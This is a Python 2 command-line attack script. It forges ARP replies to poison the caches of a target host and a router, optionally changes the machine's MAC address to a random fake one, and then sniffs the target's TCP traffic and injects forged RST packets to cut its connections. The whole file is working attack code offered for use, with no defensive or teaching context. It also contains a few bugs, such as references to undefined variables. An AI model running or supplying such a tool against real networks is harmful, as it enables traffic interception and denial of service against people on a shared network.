#!/bin/python

import os
import sys
import time
import signal
import subprocess
import random
import struct
import binascii
import pcap
import dpkt
import fcntl
import optparse
from threading import Thread
from socket import *

# console colors
W = '\033[0m' # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green

def parse_arguments():
	""" parse arguments """
	parser = optparse.OptionParser('Usage: %prog [options] dev')
	parser.add_option('-0', '--spoof', action = 'store_const', const = 1, dest = 'mode', help = 'Spoof mode, generate a fake MAC address to be used during attack')
	parser.add_option('-m', dest = 'macaddr', help='Mac address')
	parser.add_option('-s', dest = 'source', help='Source ip address (e.g. a class C address like 192.168.1.150) usually the router address')
	parser.add_option('-t', dest = 'target', help='Target ip address (e.g. a class C address like 192.168.1.150)')
	parser.add_option('-v', '--verbose', action = 'store_const', const = 2, dest = 'mode', help = 'Verbose output mode')
	parser.add_option('-d', '--dotted', action = 'store_const', const = 3, dest = 'mode', help = 'Dotted output mode')
	return parser.parse_args()

def print_counter(counter):
	""" print counter in place """
	sys.stdout.write("[+] Packets [ %d ]\r" % counter)
	sys.stdout.flush()

def print_in_line(string):
	""" print without carriage return """
	sys.stdout.write(string)
	sys.stdout.flush()

def string_to_binary(string):
	""" convert string to binary format """
	return binascii.unhexlify(string)

def binary_to_string(binary):
	""" convert binary to string """
	return binascii.hexlify(binary)

def get_mac_addr(dev):
	""" try to retrieve MAC address associated with device """
	s = socket(AF_INET, SOCK_DGRAM)
	info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', dev[:15]))
	s.close()
	return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]

def parse_mac(address):
	""" remove colon inside mac addres, if there's any """
	if len(address) == 12:
		return address
	elif len(address) == 17:
		return address.replace(':', '')
	else:
		raise ValueError('[!] Malformed MAC address')

def fake_mac_address():
	""" generate a fake MAC address """
	prefix = [(random.randint(0x00, 0x7f)) for p in xrange(6)]
	return ':'.join('%02x' % x for x in prefix)

def change_mac(dev, new_mac):
	""" try to change the MAC address associated to the device """
	subprocess.check_call(["ifconfig", "%s" % dev, "up"])
	subprocess.check_call(["ifconfig", "%s" % dev, "hw", "ether", "%s" % new_mac])

def eth_ntoa(buf):
	""" convert a MAC address from binary packed bytes to string format """
	mac_addr = ''
	for intval in struct.unpack('BBBBBB', buf):
		if intval > 15:
			replacestr = '0x'
		else:
			replacestr = 'x'
		mac_addr = ''.join([mac_addr, hex(intval).replace(replacestr, '')])
	return mac_addr

def eth_aton(buf):
	""" convert a MAC address from string to binary packed bytes format """
	addr = ''
	for i in xrange(0, len(buf), 2):
		addr = ''.join([addr, struct.pack('B', int(buf[i: i + 2], 16))],)
	return addr

def build_arp_packet(source_mac, src = None, dst = None):
	""" forge arp packets used to poison and reset target connection """
	arp = dpkt.arp.ARP()
	packet = dpkt.ethernet.Ethernet()
	if not src or not dst:
		return False
	arp.sha = string_to_binary(source_mac)
	arp.spa = inet_aton(dst)
	arp.tha = '\x00' * 6
	arp.tpa = inet_aton(src)
	arp.op = dpkt.arp.ARP_OP_REPLY
	packet.src = string_to_binary(source_mac)
	packet.dst = '\xff' * 6
	packet.data = arp
	packet.type = dpkt.ethernet.ETH_TYPE_ARP
	return packet

def poison(dev, source_mac, source, target, silent = 0):
	"""
	poison arp cache of target and router, causing all traffic between them to
	pass inside our machine, MITM heart
	"""
	sock = socket(PF_PACKET, SOCK_RAW)
	sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
	try:
		while True:
			if silent == 0:
				print "{0} <-----> {1}".format(source, target)
			sock.send(str(build_arp_packet(source_mac, source, target)))
			sock.send(str(build_arp_packet(source_mac, target, source)))
			time.sleep(5)
	except KeyboardInterrupt:
		print '\n\r[+] Poisoning interrupted'
		sock.close()

def rst_inject(dev, source_mac, source, target):
	"""
	injecting RESET packets to the target machine eventually blocking his
	connection and navigation
	"""
	sock = socket(PF_PACKET, SOCK_RAW)
	sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
	filter = 'ip host %s' % target
	# need to create a daemon that continually poison our target
	thread = Thread(target = poison, args = (dev, source_mac, source, target, 1,))
	thread.daemon = True
	thread.start()
	pc = pcap.pcap(dev)
	pc.setfilter(filter)
	print '[+] Start poisoning on ' + G + dev + W
	print '[+] Sending RST packets to ' + R + target + W
	if dotted == True:
		print '[+] Every dot symbolize a sent packet'
	counter = 0
	try:
		for ts, pkt in pc:
			eth = dpkt.ethernet.Ethernet(pkt)
			ip = eth.data
			if ip.p == dpkt.ip.IP_PROTO_TCP:
				tcp = ip.data
				if tcp.flags != dpkt.tcp.TH_RST:
					recv_tcp = dpkt.tcp.TCP(
							sport = tcp.sport,
							dport = tcp.dport,
							seq = tcp.seq + len(tcp.data),
							ack = 0,
							off_x2 = 0x50,
							flags = dpkt.tcp.TH_RST,
							win = tcp.win,
							sum = 0,
							urp = 0)
					recv_ip = dpkt.ip.IP(
							v_hl = ip.v_hl,
							tos = ip.tos,
							len = 40,
							id = ip.id + 1,
							off = 0x4000,
							ttl = 128,
							p = ip.p,
							sum = 0,
							src = ip.src,
							dst = ip.dst,
							data = recv_tcp)
					recv_eth = dpkt.ethernet.Ethernet(
							dst = eth.dst,
							src = eth.src,
							type = eth.type,
							data = recv_ip)

					sock.send(str(recv_eth))

				if dotted == True:
					print_in_line('.')
				else:
					print_counter(counter)

				tmp = ip.src
				ip.src = ip.dst
				ip.dst = tmp
				send_tcp = dpkt.tcp.TCP(
						sport = tcp.dport,
						dport = tcp.sport,
						seq = tcp.ack,
						ack = tcp.seq + len(tcp.data),
						off_x2 = 0x50,
						flags = dpkt.tcp.TH_RST,
						win = tcp.win,
						sum = 0,
						urp = 0)
				send_ip = dpkt.ip.IP(
						v_hl = ip.v_hl,
						tos = ip.tos,
						len = 40,
						id = ip.id + 1,
						off = 0x4000,
						ttl = 128,
						p = ip.p,
						sum = 0,
						src = ip.src,
						dst = ip.dst,
						data = send_tcp)
				send_eth = dpkt.ethernet.Ethernet(
						dst = eth.src,
						src = eth.dst,
						type = eth.type,
						data = send_ip)

				sock.send(str(send_eth))

			if dotted == True:
				print_in_line('.')
			else:
				print_counter(counter)
			counter += 1

	except KeyboardInterrupt:
		print '[+] Rst injection interrupted\n\r'
		sock.close()
# check privileges (low level socket and pcap require root)
if not os.geteuid() == 0:
	sys.exit('You must be root.')

(options, args) = parse_arguments()

mac_addr = ""
dotted = False

if len(args) != 1:
	print sys.argv[0] + ' -h for help'
	print '[!] Must specify interface'
	exit()

if not options.source:
	print '[!] Must specify source address'
	exit()
if not options.target:
	print '[!] Must specify target address'
	exit()

if options.mode == 3:
	dotted = True

if options.mode == 1:
	if not options.macaddr:
		try:
			mac_addr = get_mac_addr(args[0])
			print "[+] Found " + G + mac_addr + W + " associated with %s" % args[0]
		except:
			print "[!] Unable to retrieve a valid MAC address for device %s" % args[0]
			sys.exit(2)
		fake_mac = fake_mac_address()
		try:
			change_mac(args[0], fake_mac)
			print "[+] Fake MAC generated " + G + fake_mac + W + ""
		except:
			print "[!] Unable to change MAC address to device %s" % args[0]
			sys.exit(2)
		rst_inject(args[0], parse_mac(fake_addr), options.source, options.target)
		change_mac(args[0], mac_addr)
	else:
		mac_addr = options.macaddr
		print "[+] Using " + G + mac_addr + W + " MAC address"
		original_mac_addr = get_mac_addr(args[0])
		if mac_addr != original_mac_addr:
			change_mac(args[0], mac_addr)
		rst_inject(args[0], parse_mac(mac_addr), options.source, options.target)
		change_mac(args[0], original_addr)
else:
	if not options.macaddr:
		try:
			mac_addr = get_mac_addr(args[0])
			print "[+] Found " + G + mac_addr + W + " associated with %s" % args[0]
		except:
			print "[!] Unable to retrieve a valid MAC address for device %s" % args[0]
			sys.exit(2)
		rst_inject(args[0], parse_mac(mac_addr), options.source, options.target)
	else:
		mac_addr = options.macaddr
		print "[+] Using " + G + mac_addr + W + " MAC address"
		rst_inject(args[0], parse_mac(mac_addr), options.source, options.target)
